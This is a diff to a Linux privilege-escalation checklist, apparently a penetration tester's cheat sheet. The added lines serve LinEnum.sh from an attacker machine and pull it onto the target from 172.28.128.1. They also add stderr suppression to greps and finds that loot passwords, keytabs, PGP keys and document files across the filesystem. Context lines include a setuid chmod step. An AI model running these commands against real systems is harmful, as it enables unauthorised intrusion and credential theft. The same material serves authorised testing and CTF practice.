@@ -1,8 +1,21 @@
 # Linux Privilege Escalation Checklist
 
+# Check for useful tools
+which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp curl 2>/dev/null
+
+# Install Linenum.sh
+mkdir /tmp/linenum
+cd /tmp/linenum
+wget 'https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh' -O ./linenum.sh
+python -m http.server
+
+On Target:
+wget 'http://172.28.128.1:8000/linenum.sh' -O /tmp/linenum.sh
+
 # Looting Passwords
-grep -nril 'password' /home/
-grep -nril 'password' /var/
+grep -nril 'password' /home/ 2> /dev/null
+grep -R -i password /home/*  2> /dev/null
+grep -nril 'password' /var/  2> /dev/null
 find / -iname *password* 2>/dev/null
 grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
 find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
@@ -13,14 +26,14 @@ Also search for:
 /tmp/krb5.keytab             ;; Kerberos tickets
 /home/*/.gnupg/secring.gpgs  ;; PGP keys
 
-find / -type f -iname *.txt
-find / -type f -iname *.zip
-find / -type f -iname *.doc
-find / -type f -iname *.xls
-find / -type f -iname config*
-find / -type f -iname *.rar
-find / -type f -iname *.docx
-find / -type f -iname *.sql
+find / -type f -iname *.txt   2>/dev/null
+find / -type f -iname *.zip   2>/dev/null
+find / -type f -iname *.doc   2>/dev/null
+find / -type f -iname *.xls   2>/dev/null
+find / -type f -iname config* 2>/dev/null
+find / -type f -iname *.rar   2>/dev/null
+find / -type f -iname *.docx  2>/dev/null
+find / -type f -iname *.sql   2>/dev/null
 
 Check: /etc/security/opasswd
 
@@ -52,4 +65,3 @@ sudo chmod +s /tmp/suid # setuid bit
 
 ## Last Edited Files
 find / -mmin -10 2>/dev/null | grep -Ev "^/proc"
-
